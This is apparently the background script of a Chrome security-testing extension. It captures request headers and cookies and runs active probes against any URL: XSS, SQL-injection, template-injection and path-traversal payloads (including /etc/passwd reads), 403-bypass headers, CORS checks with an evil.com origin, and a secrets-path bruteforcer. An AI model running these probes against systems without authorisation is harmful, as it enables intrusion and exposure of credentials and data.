/* ═══════════════════════════════════════════════════════════════
   CYBOWARE — Background Service Worker
   ═══════════════════════════════════════════════════════════════ */

const tabHeaders = {};
const capturedRequests = {};

chrome.sidePanel.setPanelBehavior({ openPanelOnActionClick: true });

chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({ id: 'cyboware-scan', title: 'Cyboware: Scan this page', contexts: ['page'] });
  chrome.contextMenus.create({ id: 'cyboware-lookup', title: 'Cyboware: Lookup "%s"', contexts: ['selection'] });
});

chrome.contextMenus.onClicked.addListener((info, tab) => {
  if (info.menuItemId === 'cyboware-scan') chrome.sidePanel.open({ tabId: tab.id });
});

// Capture main-frame response headers
chrome.webRequest.onHeadersReceived.addListener(
  (d) => {
    if (d.tabId < 0) return;
    if (d.type === 'main_frame') {
      tabHeaders[d.tabId] = { url: d.url, statusCode: d.statusCode, responseHeaders: d.responseHeaders || [] };
    }
    if (d.type === 'xmlhttprequest' || d.type === 'fetch') {
      if (!capturedRequests[d.tabId]) capturedRequests[d.tabId] = [];
      const ex = capturedRequests[d.tabId].find(r => r.requestId === d.requestId);
      if (ex) { ex.statusCode = d.statusCode; ex.responseHeaders = d.responseHeaders; }
      else {
        capturedRequests[d.tabId].push({ requestId: d.requestId, url: d.url, method: d.method || 'GET', statusCode: d.statusCode, responseHeaders: d.responseHeaders || [], timestamp: Date.now() });
      }
      if (capturedRequests[d.tabId].length > 50) capturedRequests[d.tabId] = capturedRequests[d.tabId].slice(-50);
    }
  },
  { urls: ['<all_urls>'] }, ['responseHeaders', 'extraHeaders']
);

chrome.webRequest.onBeforeRequest.addListener(
  (d) => {
    if (d.tabId < 0 || (d.type !== 'xmlhttprequest' && d.type !== 'fetch')) return;
    if (!capturedRequests[d.tabId]) capturedRequests[d.tabId] = [];
    capturedRequests[d.tabId].push({ requestId: d.requestId, url: d.url, method: d.method || 'GET', body: d.requestBody, timestamp: Date.now() });
    if (capturedRequests[d.tabId].length > 50) capturedRequests[d.tabId] = capturedRequests[d.tabId].slice(-50);
  },
  { urls: ['<all_urls>'] }, ['requestBody']
);

chrome.webRequest.onSendHeaders.addListener(
  (d) => {
    if (d.tabId < 0 || (d.type !== 'xmlhttprequest' && d.type !== 'fetch' && d.type !== 'main_frame')) return;
    if (d.type === 'main_frame') {
      if (tabHeaders[d.tabId]) tabHeaders[d.tabId].requestHeaders = d.requestHeaders || [];
      return;
    }
    if (!capturedRequests[d.tabId]) return;
    const ex = capturedRequests[d.tabId].find(r => r.requestId === d.requestId);
    if (ex) ex.requestHeaders = d.requestHeaders;
  },
  { urls: ['<all_urls>'] }, ['requestHeaders', 'extraHeaders']
);

chrome.tabs.onRemoved.addListener((id) => { delete tabHeaders[id]; delete capturedRequests[id]; });

// Message handler
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  const h = handlers[msg.type];
  if (h) { h(msg, sender, sendResponse); return true; }
});

const handlers = {
  GET_HEADERS: (msg, _, sr) => sr({ headers: tabHeaders[msg.tabId] || null }),
  GET_CAPTURED_REQUESTS: (msg, _, sr) => sr({ requests: capturedRequests[msg.tabId] || [] }),

  FETCH_URL: async (msg, _, sr) => {
    try {
      const opts = { method: msg.method || 'GET', headers: msg.headers || {} };
      if (msg.body) opts.body = msg.body;
      const res = await fetch(msg.url, opts);
      const text = await res.text();
      const rh = {}; res.headers.forEach((v, k) => { rh[k] = v; });
      sr({ ok: true, status: res.status, statusText: res.statusText, text, headers: rh });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  FETCH_JS: async (msg, _, sr) => {
    try { const r = await fetch(msg.url); sr({ ok: true, text: await r.text() }); }
    catch (e) { sr({ ok: false, error: e.message }); }
  },

  ENUM_SUBDOMAINS: async (msg, _, sr) => {
    const domain = msg.domain;
    // Try crt.sh first
    try {
      const r = await fetch(`https://crt.sh/?q=%25.${encodeURIComponent(domain)}&output=json`, { signal: AbortSignal.timeout(10000) });
      const text = await r.text();
      if (r.ok && !text.trim().startsWith('<')) {
        try {
          const d = JSON.parse(text);
          sr({ ok: true, source: 'crt.sh', subdomains: [...new Set(d.map(e => e.name_value).flatMap(n => n.split('\n')))].sort() });
          return;
        } catch {}
      }
    } catch {}
    // Fallback: HackerTarget
    try {
      const r2 = await fetch(`https://api.hackertarget.com/hostsearch/?q=${encodeURIComponent(domain)}`, { signal: AbortSignal.timeout(10000) });
      const text2 = await r2.text();
      if (r2.ok && !text2.includes('error') && !text2.startsWith('<')) {
        const subs = text2.trim().split('\n').map(line => line.split(',')[0]).filter(Boolean);
        sr({ ok: true, source: 'hackertarget', subdomains: [...new Set(subs)].sort() });
        return;
      }
    } catch {}
    sr({ ok: false, error: 'Both crt.sh and HackerTarget failed. Try again later.' });
  },

  WAYBACK_LOOKUP: async (msg, _, sr) => {
    try {
      const r = await fetch(`https://web.archive.org/cdx/search/cdx?url=${encodeURIComponent(msg.url)}&output=json&limit=30&fl=timestamp,original,statuscode,mimetype`);
      const d = await r.json();
      sr({ ok: true, snapshots: d.slice(1) });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  TEST_CORS: async (msg, _, sr) => {
    const results = [];
    for (const origin of [msg.attackerOrigin || 'https://evil.com', 'null', msg.targetOrigin]) {
      try {
        const r = await fetch(msg.url, { method: 'OPTIONS', headers: { 'Origin': origin, 'Access-Control-Request-Method': 'GET' } });
        results.push({ origin, acao: r.headers.get('access-control-allow-origin'), acac: r.headers.get('access-control-allow-credentials'), status: r.status });
      } catch (e) { results.push({ origin, error: e.message }); }
    }
    try {
      const r = await fetch(msg.url, { headers: { 'Origin': 'https://evil.com' } });
      results.push({ type: 'GET', origin: 'https://evil.com', acao: r.headers.get('access-control-allow-origin'), acac: r.headers.get('access-control-allow-credentials'), status: r.status });
    } catch (e) { results.push({ type: 'GET', error: e.message }); }
    sr({ ok: true, results });
  },

  REPLAY_REQUEST: async (msg, _, sr) => {
    try {
      const opts = { method: msg.method || 'GET', headers: msg.headers || {} };
      if (msg.body) opts.body = msg.body;
      const r = await fetch(msg.url, opts);
      const text = await r.text();
      const rh = {}; r.headers.forEach((v, k) => { rh[k] = v; });
      sr({ ok: true, status: r.status, statusText: r.statusText, text, headers: rh });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // Full page request/response pair
  GET_PAGE_REQUEST_RESPONSE: async (msg, _, sr) => {
    try {
      const r = await fetch(msg.url, { headers: msg.headers || {} });
      const text = await r.text();
      const respHeaders = {}; r.headers.forEach((v, k) => { respHeaders[k] = v; });
      // Build request string
      const u = new URL(msg.url);
      let reqStr = `GET ${u.pathname}${u.search} HTTP/1.1\r\nHost: ${u.hostname}\r\n`;
      if (msg.headers) Object.entries(msg.headers).forEach(([k, v]) => { reqStr += `${k}: ${v}\r\n`; });
      reqStr += '\r\n';
      // Build response string
      let resStr = `HTTP/1.1 ${r.status} ${r.statusText}\r\n`;
      Object.entries(respHeaders).forEach(([k, v]) => { resStr += `${k}: ${v}\r\n`; });
      resStr += `\r\n${text.slice(0, 5000)}`;
      sr({ ok: true, request: reqStr, response: resStr, status: r.status, headers: respHeaders, body: text.slice(0, 5000) });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  TAKE_SCREENSHOT: async (msg, _, sr) => {
    try { sr({ ok: true, dataUrl: await chrome.tabs.captureVisibleTab(null, { format: 'png' }) }); }
    catch (e) { sr({ ok: false, error: e.message }); }
  },

  GET_COOKIES: async (msg, _, sr) => {
    try { sr({ ok: true, cookies: await chrome.cookies.getAll({ domain: msg.domain }) }); }
    catch (e) { sr({ ok: false, error: e.message }); }
  },

  DELETE_COOKIE: async (msg, _, sr) => {
    try { await chrome.cookies.remove({ url: msg.url, name: msg.name }); sr({ ok: true }); }
    catch (e) { sr({ ok: false, error: e.message }); }
  },

  GET_TABS: async (_, __, sr) => {
    const tabs = await chrome.tabs.query({ currentWindow: true });
    sr({ tabs: tabs.map(t => ({ id: t.id, url: t.url, title: t.title, active: t.active })) });
  },

  DNS_LOOKUP: async (msg, _, sr) => {
    try {
      const types = ['A', 'AAAA', 'MX', 'TXT', 'NS', 'CNAME'];
      const results = {};
      for (const type of types) {
        try {
          const r = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(msg.domain)}&type=${type}`);
          const d = await r.json();
          if (d.Answer) results[type] = d.Answer.map(a => a.data);
        } catch {}
      }
      sr({ ok: true, records: results });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  WHOIS_LOOKUP: async (msg, _, sr) => {
    try {
      const r = await fetch(`https://rdap.org/domain/${encodeURIComponent(msg.domain)}`);
      const d = await r.json();
      sr({ ok: true, data: d });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // Live fetch current URL to get real request/response including cookies
  LIVE_HEADERS: async (msg, _, sr) => {
    try {
      const r = await fetch(msg.url, { credentials: 'include', redirect: 'follow' });
      const respHeaders = {};
      r.headers.forEach((v, k) => { respHeaders[k] = v; });
      const body = await r.text();
      sr({ ok: true, status: r.status, statusText: r.statusText, url: r.url, headers: respHeaders, bodyPreview: body.slice(0, 500) });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // Detect WordPress plugins from page HTML
  DETECT_WP_PLUGINS: async (msg, _, sr) => {
    try {
      const r = await fetch(msg.url);
      const html = await r.text();
      const plugins = new Map();
      // Match wp-content/plugins/PLUGIN_NAME patterns
      const re = /wp-content\/plugins\/([a-zA-Z0-9_-]+)(?:\/[^?"'\s]*)?(?:\?ver=([0-9.]+))?/g;
      let m;
      while ((m = re.exec(html)) !== null) {
        const name = m[1];
        const ver = m[2] || '';
        if (!plugins.has(name) || (ver && !plugins.get(name))) plugins.set(name, ver);
      }
      // Also check wp-content/themes
      const themes = new Set();
      const reT = /wp-content\/themes\/([a-zA-Z0-9_-]+)/g;
      while ((m = reT.exec(html)) !== null) themes.add(m[1]);
      // WP version from meta
      const wpVer = html.match(/<meta[^>]*name="generator"[^>]*content="WordPress\s*([^"]*)"/) ;
      sr({ ok: true, plugins: [...plugins.entries()].map(([n,v]) => ({name:n,version:v})), themes: [...themes], wpVersion: wpVer ? wpVer[1] : null });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // Parameter Fuzzer — test params with XSS/SQLi payloads
  PARAM_FUZZ: async (msg, _, sr) => {
    const payloads = {
      xss: [
        { p: '<script>alert(1)</script>', check: 'unencoded_html' },
        { p: '"><img src=x onerror=alert(1)>', check: 'unencoded_html' },
        { p: "'-alert(1)-'", check: 'reflected' },
        { p: '<svg/onload=alert(1)>', check: 'unencoded_html' },
        { p: 'cyboXSS"onmouseover="alert(1)', check: 'unencoded_attr' },
      ],
      sqli: [
        { p: "' OR '1'='1", check: 'sqli_error' },
        { p: "1' AND '1'='1", check: 'sqli_error' },
        { p: "' UNION SELECT NULL--", check: 'sqli_error' },
        { p: "1; DROP TABLE--", check: 'sqli_error' },
      ],
      ssti: [
        { p: '{{91371*3}}', check: 'ssti_eval', expect: '274113' },
        { p: '${78234+1}', check: 'ssti_eval', expect: '78235' },
        { p: '<%= 71*6823 %>', check: 'ssti_eval', expect: '484433' },
        { p: '#{93847+1}', check: 'ssti_eval', expect: '93848' },
      ],
      path: [
        { p: '../../../etc/passwd', check: 'file_content' },
        { p: '....//....//etc/passwd', check: 'file_content' },
        { p: '..\\..\\..\\windows\\win.ini', check: 'file_content_win' },
      ],
    };

    const sqliErrors = ['sql syntax', 'mysql', 'sqlite', 'postgresql', 'ora-', 'syntax error', 'unclosed quotation', 'unterminated string', 'SQLSTATE', 'microsoft sql', 'odbc', 'jdbc', 'quoted string not properly terminated'];

    try {
      const results = [];
      const baseUrl = new URL(msg.url);
      const params = [...baseUrl.searchParams.keys()];
      if (!params.length) { sr({ ok: true, results: [], params: [], message: 'No URL parameters found. Add ?param=value to test.' }); return; }

      const category = msg.category || 'xss';
      const testPayloads = payloads[category] || payloads.xss;

      // Baseline request for comparison
      let baselineLen = 0;
      try {
        const br = await fetch(msg.url, { signal: AbortSignal.timeout(5000) });
        const bt = await br.text();
        baselineLen = bt.length;
      } catch {}

      for (const param of params.slice(0, 5)) {
        for (const { p: payload, check, expect } of testPayloads.slice(0, 4)) {
          const testUrl = new URL(msg.url);
          testUrl.searchParams.set(param, payload);
          try {
            const r = await fetch(testUrl.toString(), { redirect: 'follow', signal: AbortSignal.timeout(5000) });
            const body = await r.text();
            const rawReflected = body.includes(payload);

            // Context extraction
            let context = '';
            if (rawReflected) {
              const idx = body.indexOf(payload);
              const start = Math.max(0, idx - 80);
              const end = Math.min(body.length, idx + payload.length + 80);
              context = body.slice(start, end);
            }

            // Intelligent analysis
            let severity = 'safe';
            let analysis = '';

            if (check === 'unencoded_html') {
              const htmlEncoded = body.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
              if (rawReflected && !htmlEncoded) {
                // Check if it's in a dangerous context (not inside <title>, <meta>, comments)
                const inTitle = context.includes('<title') && context.includes('</title');
                const inMeta = context.includes('<meta');
                const inComment = context.includes('<!--');
                if (inTitle || inMeta || inComment) {
                  severity = 'low';
                  analysis = 'Reflected unencoded but inside safe context (' + (inTitle?'title':inMeta?'meta':'comment') + ')';
                } else {
                  severity = 'high';
                  analysis = 'Payload reflected UNENCODED in HTML body — likely XSS!';
                }
              } else if (htmlEncoded) {
                severity = 'safe';
                analysis = 'Reflected but HTML-encoded (safe)';
              } else {
                severity = 'safe';
                analysis = 'Not reflected';
              }
            } else if (check === 'unencoded_attr') {
              if (rawReflected && context.includes('"') && !body.includes(payload.replace(/"/g, '&quot;'))) {
                severity = 'high';
                analysis = 'Quote character reflected unencoded — attribute breakout possible';
              } else {
                severity = rawReflected ? 'low' : 'safe';
                analysis = rawReflected ? 'Reflected but quotes encoded' : 'Not reflected';
              }
            } else if (check === 'ssti_eval') {
              // Use word boundary regex to avoid matching inside longer numbers/hex
              const evalRegex = new RegExp('(?<![0-9a-fA-F])' + expect + '(?![0-9a-fA-F])');
              const evalMatch = evalRegex.exec(body);
              if (evalMatch && !rawReflected) {
                // Verify it's not inside a hex string, hash, or ID-like context
                const matchIdx = evalMatch.index;
                const surrounding = body.slice(Math.max(0, matchIdx - 40), Math.min(body.length, matchIdx + expect.length + 40));
                const inHex = /[0-9a-f]{12,}/i.test(surrounding);
                const inHash = /sha|hash|key|token|id.*=.*[0-9a-f]/i.test(surrounding);
                if (inHex || inHash) {
                  severity = 'safe';
                  analysis = 'Number found but inside hex/hash/ID string — false positive';
                } else {
                  severity = 'high';
                  analysis = 'Template expression EVALUATED — ' + payload + ' = ' + expect + '!';
                  context = surrounding;
                }
              } else if (rawReflected) {
                severity = 'safe';
                analysis = 'Literal syntax echoed back (not evaluated) — no template engine processed it';
              } else {
                severity = 'safe';
                analysis = 'Not reflected, not evaluated';
              }
            } else if (check === 'sqli_error') {
              const bodyLower = body.toLowerCase();
              const errorFound = sqliErrors.find(e => bodyLower.includes(e));
              const lenDiff = Math.abs(body.length - baselineLen);
              if (errorFound) {
                severity = 'high';
                analysis = 'SQL error detected: "' + errorFound + '"';
                const errIdx = bodyLower.indexOf(errorFound);
                context = body.slice(Math.max(0, errIdx - 40), Math.min(body.length, errIdx + errorFound.length + 80));
              } else if (r.status === 500) {
                severity = 'medium';
                analysis = 'Server error (500) — possible SQL injection';
              } else if (lenDiff > 5000) {
                severity = 'low';
                analysis = 'Significant response size change (' + lenDiff + ' bytes) — investigate';
              } else {
                severity = 'safe';
                analysis = 'No SQL errors detected';
              }
            } else if (check === 'file_content' || check === 'file_content_win') {
              const fileIndicators = check === 'file_content'
                ? ['root:', '/bin/bash', '/bin/sh', 'daemon:', 'nobody:']
                : ['[extensions]', '[fonts]', '[mci extensions]'];
              const found = fileIndicators.find(f => body.includes(f));
              if (found) {
                severity = 'high';
                analysis = 'File content detected: "' + found + '" — path traversal confirmed!';
                const fIdx = body.indexOf(found);
                context = body.slice(Math.max(0, fIdx - 20), Math.min(body.length, fIdx + 100));
              } else if (rawReflected) {
                severity = 'safe';
                analysis = 'Path reflected in page (e.g. search query) but no file content — false positive';
              } else {
                severity = 'safe';
                analysis = 'Not reflected, no file content';
              }
            } else {
              severity = rawReflected ? 'low' : 'safe';
              analysis = rawReflected ? 'Reflected (manual review needed)' : 'Not reflected';
            }

            results.push({ param, payload, severity, analysis, status: r.status, bodyLen: body.length, context: severity !== 'safe' ? context : '', url: testUrl.toString() });
          } catch (e) {
            results.push({ param, payload, severity: 'info', analysis: 'Request failed: ' + e.message, error: e.message });
          }
        }
      }
      sr({ ok: true, params, results, baselineLen });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // Subdomain Takeover Check — resolve CNAMEs and match fingerprints
  CHECK_TAKEOVER: async (msg, _, sr) => {
    const fingerprints = [
      { service: 'GitHub Pages', cnames: ['github.io'], body: "There isn't a GitHub Pages site here" },
      { service: 'Heroku', cnames: ['herokuapp.com','herokussl.com'], body: 'No such app' },
      { service: 'AWS S3', cnames: ['s3.amazonaws.com','s3-website'], body: 'NoSuchBucket' },
      { service: 'Shopify', cnames: ['myshopify.com'], body: 'Sorry, this shop is currently unavailable' },
      { service: 'Tumblr', cnames: ['tumblr.com'], body: "There's nothing here" },
      { service: 'WordPress.com', cnames: ['wordpress.com'], body: "doesn't exist" },
      { service: 'Ghost', cnames: ['ghost.io'], body: 'The thing you were looking for is no longer here' },
      { service: 'Surge.sh', cnames: ['surge.sh'], body: 'project not found' },
      { service: 'Bitbucket', cnames: ['bitbucket.io'], body: 'Repository not found' },
      { service: 'Pantheon', cnames: ['pantheonsite.io'], body: '404 error unknown site' },
      { service: 'Fastly', cnames: ['fastly.net'], body: 'Fastly error: unknown domain' },
      { service: 'Zendesk', cnames: ['zendesk.com'], body: 'Help Center Closed' },
      { service: 'Unbounce', cnames: ['unbouncepages.com'], body: 'The requested URL was not found' },
      { service: 'Fly.io', cnames: ['fly.dev','edgeapp.net'], body: 'not found' },
      { service: 'Azure', cnames: ['azurewebsites.net','cloudapp.azure.com','trafficmanager.net'], body: '' },
      { service: 'Google Cloud', cnames: ['appspot.com'], body: '' },
    ];
    try {
      const results = [];
      for (const sub of msg.subdomains.slice(0, 30)) {
        try {
          const dns = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(sub)}&type=CNAME`);
          const d = await dns.json();
          const cnames = d.Answer ? d.Answer.filter(a => a.type === 5).map(a => a.data.replace(/\.$/, '')) : [];
          if (!cnames.length) continue;

          for (const cname of cnames) {
            for (const fp of fingerprints) {
              if (fp.cnames.some(c => cname.includes(c))) {
                let vulnerable = false;
                if (fp.body) {
                  try {
                    const r = await fetch(`https://${sub}`, { signal: AbortSignal.timeout(5000) });
                    const body = await r.text();
                    vulnerable = body.includes(fp.body);
                  } catch { vulnerable = true; } // Connection refused = likely takeover
                }
                results.push({ subdomain: sub, cname, service: fp.service, vulnerable, fingerprint: fp.body || '(connection check)' });
              }
            }
          }
        } catch {}
      }
      sr({ ok: true, results });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // CSP Evaluator
  EVALUATE_CSP: (msg, _, sr) => {
    const csp = msg.csp;
    if (!csp) { sr({ ok: false, error: 'No CSP header' }); return; }
    const findings = [];
    const directives = {};
    csp.split(';').forEach(d => {
      const parts = d.trim().split(/\s+/);
      if (parts.length) directives[parts[0]] = parts.slice(1);
    });

    // Check for unsafe directives
    const checkUnsafe = (dir, values) => {
      if (!values) { findings.push({ severity: 'high', directive: dir, issue: 'Missing directive', detail: `No ${dir} defined — falls back to default-src or allows everything` }); return; }
      if (values.includes("'unsafe-inline'")) findings.push({ severity: 'high', directive: dir, issue: 'unsafe-inline', detail: 'Allows inline scripts/styles — XSS bypass' });
      if (values.includes("'unsafe-eval'")) findings.push({ severity: 'high', directive: dir, issue: 'unsafe-eval', detail: 'Allows eval() — XSS bypass via dynamic code execution' });
      if (values.includes('*')) findings.push({ severity: 'high', directive: dir, issue: 'Wildcard', detail: 'Allows loading from any origin' });
      if (values.some(v => v === 'data:')) findings.push({ severity: 'medium', directive: dir, issue: 'data: URI', detail: 'Allows data: URIs — potential XSS vector' });
      if (values.some(v => v === 'blob:')) findings.push({ severity: 'low', directive: dir, issue: 'blob: URI', detail: 'Allows blob: URIs' });
      // Known CDN bypasses
      const cdnBypasses = ['cdn.jsdelivr.net', 'cdnjs.cloudflare.com', 'unpkg.com', 'raw.githubusercontent.com', 'ajax.googleapis.com', 'cdn.rawgit.com'];
      values.forEach(v => { if (cdnBypasses.some(c => v.includes(c))) findings.push({ severity: 'medium', directive: dir, issue: 'CDN bypass', detail: `${v} — known CSP bypass via hosted libraries` }); });
      // Broad wildcards
      values.forEach(v => { if (v.startsWith('*.') || v === 'https:' || v === 'http:') findings.push({ severity: 'medium', directive: dir, issue: 'Overly broad', detail: `${v} is too permissive` }); });
    };

    checkUnsafe('script-src', directives['script-src'] || directives['default-src']);
    checkUnsafe('style-src', directives['style-src'] || directives['default-src']);
    checkUnsafe('img-src', directives['img-src']);
    checkUnsafe('connect-src', directives['connect-src']);
    checkUnsafe('frame-src', directives['frame-src'] || directives['child-src']);
    checkUnsafe('object-src', directives['object-src']);
    if (!directives['object-src']) findings.push({ severity: 'medium', directive: 'object-src', issue: 'Missing object-src', detail: "No object-src — allows Flash/plugins unless blocked by default-src" });
    if (!directives['base-uri']) findings.push({ severity: 'medium', directive: 'base-uri', issue: 'Missing base-uri', detail: "No base-uri — allows <base> tag hijacking" });
    if (!directives['form-action']) findings.push({ severity: 'low', directive: 'form-action', issue: 'Missing form-action', detail: "No form-action — forms can submit to any origin" });
    if (!directives['frame-ancestors']) findings.push({ severity: 'medium', directive: 'frame-ancestors', issue: 'Missing frame-ancestors', detail: "No frame-ancestors — page can be framed (clickjacking)" });

    // Score
    const highCount = findings.filter(f => f.severity === 'high').length;
    const medCount = findings.filter(f => f.severity === 'medium').length;
    const grade = highCount === 0 && medCount <= 1 ? 'A' : highCount === 0 ? 'B' : highCount <= 2 ? 'C' : highCount <= 4 ? 'D' : 'F';

    sr({ ok: true, directives, findings, grade, raw: csp });
  },

  // 403 Bypass Tester
  BYPASS_403: async (msg, _, sr) => {
    const url = msg.url;
    const u = new URL(url);
    const path = u.pathname;
    const techniques = [
      // Header bypasses
      { type: 'header', name: 'X-Forwarded-For: 127.0.0.1', headers: { 'X-Forwarded-For': '127.0.0.1' } },
      { type: 'header', name: 'X-Forwarded-Host: 127.0.0.1', headers: { 'X-Forwarded-Host': '127.0.0.1' } },
      { type: 'header', name: 'X-Original-URL: ' + path, headers: { 'X-Original-URL': path } },
      { type: 'header', name: 'X-Rewrite-URL: ' + path, headers: { 'X-Rewrite-URL': path } },
      { type: 'header', name: 'X-Custom-IP-Authorization: 127.0.0.1', headers: { 'X-Custom-IP-Authorization': '127.0.0.1' } },
      { type: 'header', name: 'X-Real-IP: 127.0.0.1', headers: { 'X-Real-IP': '127.0.0.1' } },
      { type: 'header', name: 'Referer: ' + u.origin, headers: { 'Referer': u.origin + '/' } },
      // Path bypasses
      { type: 'path', name: path + '/', url: u.origin + path + '/' },
      { type: 'path', name: path + '..;/', url: u.origin + path + '..;/' },
      { type: 'path', name: '/.' + path, url: u.origin + '/.' + path },
      { type: 'path', name: path + '%20', url: u.origin + path + '%20' },
      { type: 'path', name: path + '%09', url: u.origin + path + '%09' },
      { type: 'path', name: path + '?', url: u.origin + path + '?' },
      { type: 'path', name: path + '#', url: u.origin + path + '%23' },
      { type: 'path', name: path + '.json', url: u.origin + path + '.json' },
      { type: 'path', name: '/' + path.split('/').pop(), url: u.origin + '/' + path.split('/').pop() },
      // Method override
      { type: 'header', name: 'X-HTTP-Method-Override: GET', headers: { 'X-HTTP-Method-Override': 'GET' }, method: 'POST' },
    ];
    try {
      // Baseline
      let baseStatus;
      try { const br = await fetch(url, { signal: AbortSignal.timeout(5000) }); baseStatus = br.status; } catch { baseStatus = 0; }
      const results = [{ technique: 'Baseline', status: baseStatus, type: 'baseline' }];
      for (const t of techniques) {
        try {
          const opts = { method: t.method || 'GET', headers: t.headers || {}, redirect: 'manual', signal: AbortSignal.timeout(5000) };
          const testUrl = t.url || url;
          const r = await fetch(testUrl, opts);
          const bypass = r.status >= 200 && r.status < 400 && baseStatus >= 400;
          results.push({ technique: t.name, type: t.type, status: r.status, bypass, url: testUrl });
        } catch (e) {
          results.push({ technique: t.name, type: t.type, status: 'err', error: e.message });
        }
      }
      sr({ ok: true, baseStatus, results });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // HTTP Method Tester — compares body to detect real vs fake acceptance
  METHOD_TEST: async (msg, _, sr) => {
    const methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD', 'TRACE'];
    try {
      // Baseline GET
      let baseBody = '', baseStatus = 0, baseHeaders = {};
      try {
        const br = await fetch(msg.url, { signal: AbortSignal.timeout(5000) });
        baseBody = await br.text(); baseStatus = br.status;
        br.headers.forEach((v, k) => { baseHeaders[k] = v; });
      } catch {}

      const results = [{ method: 'GET', status: baseStatus, bodyLen: baseBody.length, headers: baseHeaders, baseline: true }];
      for (const method of methods.slice(1)) {
        try {
          const r = await fetch(msg.url, { method, redirect: 'follow', signal: AbortSignal.timeout(5000) });
          const body = method === 'HEAD' ? '' : await r.text();
          const rh = {}; r.headers.forEach((v, k) => { rh[k] = v; });
          const allow = rh['allow'] || '';
          // Compare body to baseline to detect real method handling
          const bodyDiff = method !== 'HEAD' ? Math.abs(body.length - baseBody.length) : 0;
          const sameAsGet = bodyDiff < 50; // Within 50 bytes = same page
          const accepted = r.status >= 200 && r.status < 400;
          const realDanger = accepted && !sameAsGet && ['PUT','DELETE','PATCH','TRACE'].includes(method);
          const fakeAccept = accepted && sameAsGet && ['PUT','DELETE','PATCH'].includes(method);
          results.push({ method, status: r.status, bodyLen: body.length, bodyDiff, sameAsGet, realDanger, fakeAccept, allow, headers: rh, preview: realDanger ? body.slice(0, 200) : '' });
        } catch (e) {
          results.push({ method, status: 'err', error: e.message });
        }
      }
      sr({ ok: true, results });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // Directory Bruteforcer — parallel batches, category-based
  DIR_BRUTE: async (msg, _, sr) => {
    const pathSets = {
      common: ['/.git/HEAD', '/.env', '/robots.txt', '/sitemap.xml', '/.well-known/security.txt', '/admin', '/login', '/dashboard', '/graphql', '/api', '/swagger.json', '/.DS_Store', '/backup.zip', '/config.json', '/package.json', '/debug', '/console', '/server-status'],
      wordpress: ['/wp-login.php', '/wp-admin/', '/wp-config.php', '/wp-config.php.bak', '/wp-config.php.old', '/wp-content/', '/wp-includes/', '/wp-json/', '/wp-json/wp/v2/users', '/xmlrpc.php', '/wp-cron.php', '/readme.html', '/license.txt', '/wp-content/debug.log', '/wp-content/uploads/', '/wp-content/plugins/', '/wp-admin/install.php'],
      php_laravel: ['/phpinfo.php', '/info.php', '/test.php', '/.env', '/.env.local', '/.env.production', '/.env.backup', '/storage/logs/laravel.log', '/vendor/', '/artisan', '/telescope', '/horizon', '/nova', '/_debugbar', '/config/app.php'],
      java_spring: ['/actuator', '/actuator/health', '/actuator/env', '/actuator/mappings', '/actuator/beans', '/actuator/configprops', '/actuator/heapdump', '/swagger-ui.html', '/swagger.json', '/v2/api-docs', '/v3/api-docs', '/jolokia', '/console', '/h2-console', '/druid'],
      dotnet: ['/web.config', '/elmah.axd', '/trace.axd', '/Trace.axd', '/applicationinsights', '/_blazor', '/api/swagger', '/hangfire', '/miniprofiler', '/Elmah', '/Error'],
      node_js: ['/package.json', '/package-lock.json', '/.npmrc', '/node_modules/', '/server.js', '/app.js', '/.env', '/config.json', '/graphql', '/graphiql', '/__webpack_hmr', '/_next/data', '/api/health'],
      devops: ['/.git/HEAD', '/.git/config', '/.gitignore', '/.svn/entries', '/.hg/', '/CVS/Root', '/.dockerenv', '/Dockerfile', '/docker-compose.yml', '/.github/', '/.gitlab-ci.yml', '/Jenkinsfile', '/.circleci/config.yml', '/Makefile'],
      backups: ['/backup', '/backup.zip', '/backup.tar.gz', '/backup.sql', '/dump.sql', '/db.sql', '/database.sql', '/site.tar.gz', '/www.zip', '/.bak', '/old/', '/copy/', '/temp/'],
    };
    const category = msg.category || 'common';
    const paths = category === 'all' ? [...new Set(Object.values(pathSets).flat())] : pathSets[category] || pathSets.common;

    try {
      const u = new URL(msg.url);
      const origin = u.origin;
      // Scan from root, parent directory, AND current path as directory
      const parentDir = u.pathname.replace(/\/[^/]*$/, '/'); // /admin/panel → /admin/
      const currentAsDir = u.pathname.endsWith('/') ? u.pathname : u.pathname + '/'; // /admin/panel → /admin/panel/
      const bases = new Set(['']); // root always
      if (parentDir !== '/') bases.add(parentDir);
      if (currentAsDir !== '/' && currentAsDir !== parentDir) bases.add(currentAsDir);

      const results = [];
      const allPaths = [];
      bases.forEach(base => { paths.forEach(p => {
        // Avoid double slashes: /minar/ + /.env → /minar/.env
        const joined = base ? (base + p).replace(/\/\//g, '/') : p;
        allPaths.push(joined);
      }); });
      const uniquePaths = [...new Set(allPaths)];
      // Run in parallel batches of 8 for speed
      for (let i = 0; i < uniquePaths.length; i += 8) {
        const batch = uniquePaths.slice(i, i + 8);
        const promises = batch.map(async (path) => {
          try {
            const r = await fetch(origin + path, { redirect: 'manual', signal: AbortSignal.timeout(2000) });
            const interesting = r.status === 200 || r.status === 301 || r.status === 302 || r.status === 401 || r.status === 403;
            if (interesting) {
              let preview = '';
              if (r.status === 200) { try { preview = (await r.text()).slice(0, 200); } catch {} }
              return { path, status: r.status, preview };
            }
          } catch {}
          return null;
        });
        (await Promise.all(promises)).forEach(r => { if (r) results.push(r); });
      }
      sr({ ok: true, results, total: uniquePaths.length, category });
    } catch (e) { sr({ ok: false, error: e.message }); }
  }
};
